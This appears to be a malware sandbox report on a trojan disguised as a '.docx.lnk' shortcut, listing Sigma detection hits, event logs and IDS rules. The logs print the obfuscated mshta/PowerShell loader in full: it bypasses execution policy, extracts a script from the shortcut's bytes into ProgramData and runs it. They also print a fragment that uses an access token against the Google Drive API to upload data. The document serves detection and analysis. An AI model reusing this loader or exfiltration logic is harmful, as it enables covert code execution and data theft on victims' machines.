threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

sigma_analysis_results.rule_title: Suspicious Parent Double Extension File Execution
sigma_analysis_results.rule_description: Detect execution of suspicious double extension files in ParentCommandLine

match_context.values: @{Product=Internet Explorer; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=MSHTA.EXE; Hashes=MD5=0B4340ED812DC82CE636C00FA5C9BEF2,SHA256=DBA3137811C686FD35E418D76184070E031F207002649DA95385DFD05A8BB895,IMPHASH=DCDEE2FF2311B9AE7C4D768FA56524DD; Description=Microsoft (R) HTML Application host; EventID=1; ParentCommandLine="C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe" Start-Process -FilePath "C:\Users\Bruno\Desktop\20250206_68013.docx.lnk"; CommandLine="C:\Windows\System32\mshta.exe" javascript:s="a=new Ac"+"tiveXObject('WSc"+"ript.Shell');a.Run(c,0,true);close();";c="powe"+"rshell -ep bypass -c $t=0x1bb6;$k = Get-ChildItem *.lnk | where-object {$_.length -eq $t} | Select-Object -ExpandProperty Name;if($k.count -eq 0){$k=Get-ChildItem $env:T"+"EMP\\*\\*.lnk | where-object{$_.length -eq $t};};$f=gc $k -Encoding Byte;$w='c:\\programdata\\d.ps1';sc $w ([byte[]]($f | select -Skip 0x092a)) -Force -Encoding Byte ;sc c:\\programdata\\b261 0;po"+"wers [TRUNCATED]; FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\mshta.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects suspicious PowerShell invocation with a parameter substring
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\mshta.exe" javascript:s="a=new Ac"+"tiveXObject('WSc"+"ript.Shell');a.Run(c,0,true);close();";c="powe"+"rshell -ep bypass -c $t=0x1bb6;$k = Get-ChildItem *.lnk | where-object {$_.length -eq $t} | Select-Object -ExpandProperty Name;if($k.count -eq 0){$k=Get-ChildItem $env:T"+"EMP\\*\\*.lnk | where-object{$_.length -eq $t};};$f=gc $k -Encoding Byte;$w='c:\\programdata\\d.ps1';sc $w ([byte[]]($f | select -Skip 0x092a)) -Force -Encoding Byte ;sc c:\\programdata\\b261 0;po"+"wers [TRUNCATED]; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass -c $t=0x1bb6;$k = Get-ChildItem *.lnk | where-object {$_.length -eq $t} | Select-Object -ExpandProperty Name;if($k.count -eq 0){$k=Get-ChildItem $env:TEMP\*\*.lnk | where-object{$_.length -eq $t};};$f=gc $k -Encoding Byte;$w='c:\programdata\d.ps1';sc $w ([byte[]]($f | select -Skip 0x092a)) -Force -Encoding Byte ;sc c:\programdata\b261 0;powershell -ep bypass -f $w;; EventID=1; ParentImage=C:\Windows\System32\mshta.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Windows Shell/Scripting Processes Spawning Suspicious Programs
sigma_analysis_results.rule_description: Detects suspicious child processes of a Windows shell and scripting processes such as wscript, rundll32, powershell, mshta...etc.

sigma_analysis_results.rule_description: Detects execution of javascript code using "mshta.exe".
sigma_analysis_results.rule_author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community

match_context.values: @{Hashes=MD5=0B4340ED812DC82CE636C00FA5C9BEF2,SHA256=DBA3137811C686FD35E418D76184070E031F207002649DA95385DFD05A8BB895,IMPHASH=DCDEE2FF2311B9AE7C4D768FA56524DD; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=MSHTA.EXE; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; EventID=1; ParentCommandLine="C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe" Start-Process -FilePath "C:\Users\Bruno\Desktop\20250206_68013.docx.lnk"; CommandLine="C:\Windows\System32\mshta.exe" javascript:s="a=new Ac"+"tiveXObject('WSc"+"ript.Shell');a.Run(c,0,true);close();";c="powe"+"rshell -ep bypass -c $t=0x1bb6;$k = Get-ChildItem *.lnk | where-object {$_.length -eq $t} | Select-Object -ExpandProperty Name;if($k.count -eq 0){$k=Get-ChildItem $env:T"+"EMP\\*\\*.lnk | where-object{$_.length -eq $t};};$f=gc $k -Encoding Byte;$w='c:\\programdata\\d.ps1';sc $w ([byte[]]($f | select -Skip 0x092a)) -Force -Encoding Byte ;sc c:\\programdata\\b261 0;po"+"wers [TRUNCATED]; FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\mshta.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Change PowerShell Policies to an Insecure Level
sigma_analysis_results.rule_description: Detects changing the PowerShell script execution policy to a potentially insecure level using the "-ExecutionPolicy" flag.

match_context.values: @{Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\System32\mshta.exe" javascript:s="a=new Ac"+"tiveXObject('WSc"+"ript.Shell');a.Run(c,0,true);close();";c="powe"+"rshell -ep bypass -c $t=0x1bb6;$k = Get-ChildItem *.lnk | where-object {$_.length -eq $t} | Select-Object -ExpandProperty Name;if($k.count -eq 0){$k=Get-ChildItem $env:T"+"EMP\\*\\*.lnk | where-object{$_.length -eq $t};};$f=gc $k -Encoding Byte;$w='c:\\programdata\\d.ps1';sc $w ([byte[]]($f | select -Skip 0x092a)) -Force -Encoding Byte ;sc c:\\programdata\\b261 0;po"+"wers [TRUNCATED]; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass -c $t=0x1bb6;$k = Get-ChildItem *.lnk | where-object {$_.length -eq $t} | Select-Object -ExpandProperty Name;if($k.count -eq 0){$k=Get-ChildItem $env:TEMP\*\*.lnk | where-object{$_.length -eq $t};};$f=gc $k -Encoding Byte;$w='c:\programdata\d.ps1';sc $w ([byte[]]($f | select -Skip 0x092a)) -Force -Encoding Byte ;sc c:\programdata\b261 0;powershell -ep bypass -f $w;; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\mshta.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values:
@{ScriptBlockText=UploadLog($accesstoken)

$q = "q=name+contains+'$objName'+and+not+fullText+contains+'result'+and+mimeType+!=+'application/vnd.google-apps.folder'"

$ur = "https://www.googleapis.com/drive/v3/files" + "?" + $q 
$response = Invoke-RestMethod -Uri $ur -Headers $dnHeader 

$files = $response.files
$cout = $files.Count; Path=; ScriptBlockId=8387ec25-30dc-4768-b069-1fc6e8213cf3; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

sigma_analysis_results.rule_description: Detects PowerShell creating a PowerShell file (.ps1). While often times this behavior is benign, sometimes it can be a sign of a dropper script trying to achieve persistence.

match_context.values: @{Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\ProgramData\d.ps1}

sigma_analysis_results.rule_title: PowerShell Script With File Upload Capabilities
sigma_analysis_results.rule_description: Detects PowerShell scripts leveraging the "Invoke-WebRequest" cmdlet to send data via either "PUT" or "POST" method.

crowdsourced_ids_results.rule_raw: alert icmp $HOME_NET any -> $EXTERNAL_NET any ( msg:"PROTOCOL-ICMP Unusual PING detected"; icode:0; itype:8; fragbits:!M; content:!"ABCDEFGHIJKLMNOPQRSTUVWABCDEFGHI",depth 32; content:!"0123456789abcdefghijklmnopqrstuv",depth 32; content:!"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE",depth 36; content:!"WANG2"; content:!"cacti-monitoring-system",depth 65; content:!"SolarWinds",depth 72; metadata:policy max-detect-ips drop,ruleset community; reference:url,krebsonsecurity.com/2014/01/a-closer-look-at-the-target-malware-part-ii/; reference:url,krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/; classtype:successful-recon-limited; sid:29456; rev:3; )
alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:"PROTOCOL-ICMP PING Windows"; itype:8; content:"abcdefghijklmnop",depth 16; metadata:ruleset community; classtype:misc-activity; sid:382; rev:11; )
alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:"PROTOCOL-ICMP PING"; icode:0; itype:8; metadata:ruleset community; classtype:misc-activity; sid:384; rev:8; )
alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:"PROTOCOL-ICMP Echo Reply"; icode:0; itype:0; metadata:ruleset community; classtype:misc-activity; sid:408; rev:8; )

crowdsourced_ids_results.rule_msg: ET POLICY Dropbox.com Offsite File Backup in Use
crowdsourced_ids_results.rule_raw: alert tls [108.160.162.0/20,162.125.0.0/16,192.189.200.0/23,199.47.216.0/22,205.189.0.0/24,209.99.70.0/24,45.58.64.0/20] 443 -> $HOME_NET any (msg:"ET POLICY Dropbox.com Offsite File Backup in Use"; flow:established,to_client; tls.cert_subject; content:"CN=*.dropbox.com"; fast_pattern; threshold: type limit, count 1, seconds 300, track by_src; reference:url,www.dropbox.com; reference:url,dereknewton.com/2011/04/dropbox-authentication-static-host-ids/; classtype:policy-violation; sid:2012647; rev:7; metadata:created_at 2011_04_07, confidence High, signature_severity Informational, updated_at 2022_03_25;)
